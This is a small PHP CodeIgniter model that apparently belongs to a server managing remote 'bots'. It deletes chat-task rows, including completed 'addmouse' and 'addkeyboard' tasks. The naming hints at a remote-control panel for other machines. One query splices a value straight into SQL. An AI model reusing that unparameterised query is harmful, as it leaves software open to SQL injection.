<?php if ( ! defined('BASEPATH')) exit('No direct script access allowed'); 

class Screen_mdl extends CI_Model {
	
    private $guid;
	  private $pnetbot;
    private $netbots;
    private $json_data;
    private $lastip;
    private $thistime;
    private $tasktype;
    public function __construct()
    {
       parent::__construct();
       $this->guid=$this->bot->guid;
      
       $this->netbots=$this->bot->netbots;
       $this->json_data=$this->bot->json_data;
       $this->lastip=$this->bot->lastip;
       $this->thistime=$this->bot->thistime;
       $this->tasktype=$this->bot->tasktype;
       $this->pnetbot=$this->bot->pnetbot;
       
    }
      
      public function go()
      {
     if($this->tasktype=="chat"){
     $this->db->query("delete   FROM tasklist_chat where tl_id=".$this->pnetbot['tl_id']);
     $this->db->query("delete   FROM tasklist_chat where tl_stauts=1 and  tl_function='addmouse' ");
     $this->db->query("delete   FROM tasklist_chat where tl_stauts=1 and  tl_function='addkeyboard' ");
     }

  	   return true;
      }
      

}